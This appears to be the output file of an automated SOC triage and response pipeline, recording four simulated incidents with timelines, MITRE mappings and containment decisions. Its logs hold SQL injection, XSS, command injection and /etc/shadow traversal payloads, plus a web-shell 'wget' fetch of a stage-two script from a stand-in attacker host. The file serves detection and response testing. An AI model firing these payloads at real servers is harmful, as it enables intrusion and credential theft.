@@ -1,0 +1,369 @@
+{
+  "timestamp_utc": "2026-11-20T17:28:15.722340+00:00",
+  "target_web_server": "http://130.210.70.6",
+  "llm_endpoint": "http://localhost:11434",
+  "scenarios_total": 4,
+  "all_stages_valid": true,
+  "scenarios": [
+    {
+      "title": "1. Live Multi-Vector Web Exploitation (SQLi + XSS + RCE + LFI on OCI web-server)",
+      "incident_id": "inc-e0e6dc71830f4782aa22e753cca03fc3",
+      "correlation_key": [
+        "198.51.100.44",
+        "prod-web-server"
+      ],
+      "event_count": 6,
+      "triage": {
+        "timeline": [
+          "[WAF sev=9] 198.51.100.44 -> prod-web-server: ModSecurity CRS rule 949110: Inbound Anomaly Score Exceeded (Total Score: 23) req=GET /?id=1%27+UNION+SELECT+null%2Cusername%2Cpassword+FROM+users-- HTTP/1.1",
+          "[WAF sev=9] 198.51.100.44 -> prod-web-server: ModSecurity CRS rule 949110: Inbound Anomaly Score Exceeded (Total Score: 23) req=GET /?search=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1",
+          "[WAF sev=9] 198.51.100.44 -> prod-web-server: ModSecurity CRS rule 949110: Inbound Anomaly Score Exceeded (Total Score: 18) req=GET /?cmd=%3B+cat+%2Fetc%2Fpasswd HTTP/1.1",
+          "[WAF sev=9] 198.51.100.44 -> prod-web-server: ModSecurity CRS rule 949110: Inbound Anomaly Score Exceeded (Total Score: 33) req=GET /?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1",
+          "[WAZUH sev=8] 198.51.100.44 -> prod-web-server: Wazuh rule 100201: Repeated ModSecurity Access denied HTTP 403 alerts for SQL injection and local file /etc/shadow read attempts",
+          "[FLOWLOG sev=7] 198.51.100.44 -> prod-web-server: OCI VCN flowlog: sustained inbound HTTP attack burst to port 80 from external source"
+        ],
+        "entities": {
+          "ips": [
+            "198.51.100.44"
+          ],
+          "assets": [
+            "prod-web-server"
+          ]
+        },
+        "cited_event_ids": [
+          "evt-s1-waf-1",
+          "evt-s1-waf-2",
+          "evt-s1-waf-3",
+          "evt-s1-waf-4",
+          "evt-s1-wazuh-1",
+          "evt-s1-flow-1"
+        ]
+      },
+      "mitre": {
+        "techniques": [
+          "T1190",
+          "T1059",
+          "T1005"
+        ],
+        "justification": {
+          "T1190": "Exploit Public-Facing Application: Web exploitation payload detected against HTTP service",
+          "T1059": "Command and Scripting Interpreter: OS command execution or shell invocation attempt",
+          "T1005": "Data from Local System: Attempt to access sensitive local system files"
+        },
+        "cited_event_ids": [
+          "evt-s1-waf-1",
+          "evt-s1-waf-2",
+          "evt-s1-waf-3",
+          "evt-s1-waf-4",
+          "evt-s1-wazuh-1",
+          "evt-s1-flow-1"
+        ]
+      },
+      "decision": {
+        "proposed_action": "block_ip_waf",
+        "justification": "Confirmed active web application exploitation attempts (T1005, T1059, T1190); blocking the offending source IP at the WAF prevents further attack progression.",
+        "cited_event_ids": [
+          "evt-s1-flow-1",
+          "evt-s1-waf-1",
+          "evt-s1-waf-2",
+          "evt-s1-waf-3",
+          "evt-s1-waf-4",
+          "evt-s1-wazuh-1"
+        ]
+      },
+      "validation_errors": [],
+      "risk_score": 0.8850000000000001,
+      "final_decision": "autonomous",
+      "execution_result": {
+        "action": "block_ip_waf",
+        "status": "simulated",
+        "details": {
+          "simulated_call": {
+            "network_address_list_id": "ocid1.wafnetworkaddresslist.oc1..dummy-block",
+            "display_name": "SOC-OCI-Block-List",
+            "addresses": [
+              "198.51.100.44/32"
+            ]
+          }
+        }
+      },
+      "target": "http://130.210.70.6",
+      "live_http_probes": [
+        {
+          "url": "http://130.210.70.6/?id=1%27+UNION+SELECT+null%2Cusername%2Cpassword+FROM+users--",
+          "http_status": 403,
+          "blocked": true
+        },
+        {
+          "url": "http://130.210.70.6/?search=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
+          "http_status": 403,
+          "blocked": true
+        },
+        {
+          "url": "http://130.210.70.6/?cmd=%3B+cat+%2Fetc%2Fpasswd",
+          "http_status": 403,
+          "blocked": true
+        },
+        {
+          "url": "http://130.210.70.6/?file=..%2F..%2F..%2F..%2Fetc%2Fshadow",
+          "http_status": 403,
+          "blocked": true
+        }
+      ],
+      "ssh_captured_blocks": [
+        {
+          "rule_id": "949110",
+          "msg": "Inbound Anomaly Score Exceeded (Total Score: 23)",
+          "request": "GET /?id=1%27+UNION+SELECT+null%2Cusername%2Cpassword+FROM+users-- HTTP/1.1"
+        },
+        {
+          "rule_id": "949110",
+          "msg": "Inbound Anomaly Score Exceeded (Total Score: 23)",
+          "request": "GET /?search=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1"
+        },
+        {
+          "rule_id": "949110",
+          "msg": "Inbound Anomaly Score Exceeded (Total Score: 18)",
+          "request": "GET /?cmd=%3B+cat+%2Fetc%2Fpasswd HTTP/1.1"
+        },
+        {
+          "rule_id": "949110",
+          "msg": "Inbound Anomaly Score Exceeded (Total Score: 33)",
+          "request": "GET /?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1"
+        }
+      ]
+    },
+    {
+      "title": "2. Host Compromise, C2 Beaconing & Database Lateral Movement (prod-db-server)",
+      "incident_id": "inc-75f093545a184b0cbdba75ca5cf84e19",
+      "correlation_key": [
+        "203.0.113.55",
+        "prod-db-server"
+      ],
+      "event_count": 5,
+      "triage": {
+        "timeline": [
+          "[WAF sev=9] 203.0.113.55 -> prod-db-server: Web exploit detected: POST /upload.php SQL injection bypass",
+          "[WAZUH sev=9] 203.0.113.55 -> prod-db-server: web shell file created: /var/www/html/uploads/cmd.php",
+          "[WAZUH sev=9] 203.0.113.55 -> prod-db-server: process spawned by www-data: /bin/sh -c 'wget http://203.0.113.55/stage2.sh'",
+          "[FLOWLOG sev=8] 203.0.113.55 -> prod-db-server: periodic outbound beacon every 30s to C2 203.0.113.55:443",
+          "[FLOWLOG sev=9] 203.0.113.55 -> prod-db-server: internal connection attempt -> db tier 10.0.2.15:5432 (lateral movement blocked)"
+        ],
+        "entities": {
+          "ips": [
+            "203.0.113.55"
+          ],
+          "assets": [
+            "prod-db-server"
+          ]
+        },
+        "cited_event_ids": [
+          "evt-s2-waf-1",
+          "evt-s2-wazuh-1",
+          "evt-s2-wazuh-2",
+          "evt-s2-flow-1",
+          "evt-s2-flow-2"
+        ]
+      },
+      "mitre": {
+        "techniques": [
+          "T1190",
+          "T1059",
+          "T1505",
+          "T1071",
+          "T1105",
+          "T1021"
+        ],
+        "justification": {
+          "T1190": "Exploit Public-Facing Application: Web exploitation payload detected against HTTP service",
+          "T1059": "Command and Scripting Interpreter: OS command execution or shell invocation attempt",
+          "T1505": "Server Software Component: Persistent web shell or scheduled task creation",
+          "T1071": "Application Layer Protocol: Outbound command-and-control beaconing over application layer",
+          "T1105": "Ingress Tool Transfer: External payload or tool download attempt",
+          "T1021": "Remote Services: Lateral movement attempt toward internal service tier"
+        },
+        "cited_event_ids": [
+          "evt-s2-waf-1",
+          "evt-s2-wazuh-1",
+          "evt-s2-wazuh-2",
+          "evt-s2-flow-1",
+          "evt-s2-flow-2"
+        ]
+      },
+      "decision": {
+        "proposed_action": "isolate_sg",
+        "justification": "Detected post-exploitation, persistence, C2, or lateral movement indicators (T1021, T1059, T1071, T1105, T1190, T1505); host network quarantine via NSG isolation is proportionate.",
+        "cited_event_ids": [
+          "evt-s2-flow-1",
+          "evt-s2-flow-2",
+          "evt-s2-waf-1",
+          "evt-s2-wazuh-1",
+          "evt-s2-wazuh-2"
+        ]
+      },
+      "validation_errors": [],
+      "risk_score": 0.9625,
+      "final_decision": "autonomous",
+      "execution_result": {
+        "action": "isolate_sg",
+        "status": "simulated",
+        "details": {
+          "simulated_call": "simulated quarantine: replace instance VNIC NSG with quarantine NSG (allowing only Wazuh mgr and admin IP)"
+        }
+      }
+    },
+    {
+      "title": "3. Automated Reconnaissance & Scanner Probing (SQLMap + Nikto on web-server)",
+      "incident_id": "inc-7c639607bc714b5d8b3f2ab91ddf0bd1",
+      "correlation_key": [
+        "198.51.100.88",
+        "dev-web-server"
+      ],
+      "event_count": 3,
+      "triage": {
+        "timeline": [
+          "[WAF sev=6] 198.51.100.88 -> dev-web-server: HTTP 403 blocked automated security scanner fingerprint: sqlmap/1.7.2 (rule 913100)",
+          "[WAF sev=6] 198.51.100.88 -> dev-web-server: HTTP 403 blocked automated web vulnerability scanner: Nikto/2.1.6 probing (rule 913100)",
+          "[FLOWLOG sev=5] 198.51.100.88 -> dev-web-server: port scan: 64 distinct ports probed on target interface in 12s"
+        ],
+        "entities": {
+          "ips": [
+            "198.51.100.88"
+          ],
+          "assets": [
+            "dev-web-server"
+          ]
+        },
+        "cited_event_ids": [
+          "evt-s3-waf-1",
+          "evt-s3-waf-2",
+          "evt-s3-flow-1"
+        ]
+      },
+      "mitre": {
+        "techniques": [
+          "T1046",
+          "T1595"
+        ],
+        "justification": {
+          "T1046": "Network Service Discovery: Multi-port probing across target host",
+          "T1595": "Active Scanning: Automated vulnerability scanner reconnaissance fingerprint"
+        },
+        "cited_event_ids": [
+          "evt-s3-waf-1",
+          "evt-s3-waf-2",
+          "evt-s3-flow-1"
+        ]
+      },
+      "decision": {
+        "proposed_action": "soft_rate_limit",
+        "justification": "Observed reconnaissance scanning or brute-force probing (T1046, T1595); applying temporary WAF rate limiting mitigates impact while minimizing false-positive risk.",
+        "cited_event_ids": [
+          "evt-s3-flow-1",
+          "evt-s3-waf-1",
+          "evt-s3-waf-2"
+        ]
+      },
+      "validation_errors": [],
+      "risk_score": 0.5508333333333333,
+      "final_decision": "soft_contain",
+      "execution_result": {
+        "action": "soft_rate_limit",
+        "status": "simulated",
+        "details": {
+          "simulated_call": {
+            "network_address_list_id": "ocid1.wafnetworkaddresslist.oc1..dummy-ratelimit",
+            "display_name": "SOC-OCI-RateLimit-List",
+            "addresses": [
+              "198.51.100.88/32"
+            ]
+          }
+        }
+      },
+      "target": "http://130.210.70.6",
+      "live_http_probes": [
+        {
+          "url": "http://130.210.70.6/",
+          "http_status": 403,
+          "blocked": true
+        },
+        {
+          "url": "http://130.210.70.6/",
+          "http_status": 403,
+          "blocked": true
+        }
+      ]
+    },
+    {
+      "title": "4. High-Diversity SSH Username Spray Attack (Wazuh Rule 5710 + Auth Policy R2)",
+      "incident_id": "inc-7162b51856034429a804bf0c57c61a2d",
+      "correlation_key": [
+        "198.51.100.77",
+        "prod-web-server"
+      ],
+      "event_count": 4,
+      "triage": {
+        "timeline": [
+          "[WAZUH sev=5] 198.51.100.77 -> prod-web-server: sshd: Attempt to login using a non-existent user (brute force)",
+          "[WAZUH sev=5] 198.51.100.77 -> prod-web-server: sshd: Attempt to login using a non-existent user (brute force)",
+          "[WAZUH sev=5] 198.51.100.77 -> prod-web-server: sshd: Attempt to login using a non-existent user (brute force)",
+          "[WAZUH sev=5] 198.51.100.77 -> prod-web-server: sshd: Attempt to login using a non-existent user (brute force)"
+        ],
+        "entities": {
+          "ips": [
+            "198.51.100.77"
+          ],
+          "assets": [
+            "prod-web-server"
+          ]
+        },
+        "cited_event_ids": [
+          "evt-2c13310f",
+          "evt-3177981a",
+          "evt-b320d9a0",
+          "evt-c8151142"
+        ]
+      },
+      "mitre": {
+        "techniques": [
+          "T1110"
+        ],
+        "justification": {
+          "T1110": "Brute Force: Repeated authentication failures or credential guessing observed"
+        },
+        "cited_event_ids": [
+          "evt-2c13310f",
+          "evt-3177981a",
+          "evt-b320d9a0",
+          "evt-c8151142"
+        ]
+      },
+      "decision": {
+        "proposed_action": "soft_rate_limit",
+        "justification": "Observed reconnaissance scanning or brute-force probing (T1110); applying temporary WAF rate limiting mitigates impact while minimizing false-positive risk.",
+        "cited_event_ids": [
+          "evt-2c13310f",
+          "evt-3177981a",
+          "evt-b320d9a0",
+          "evt-c8151142"
+        ]
+      },
+      "validation_errors": [],
+      "risk_score": 0.6366666666666666,
+      "final_decision": "soft_contain",
+      "execution_result": {
+        "action": "soft_rate_limit",
+        "status": "simulated",
+        "details": {
+          "simulated_call": {
+            "network_address_list_id": "ocid1.wafnetworkaddresslist.oc1..dummy-ratelimit",
+            "display_name": "SOC-OCI-RateLimit-List",
+            "addresses": [
+              "198.51.100.77/32"
+            ]
+          }
+        }
+      }
+    }
+  ]
+}
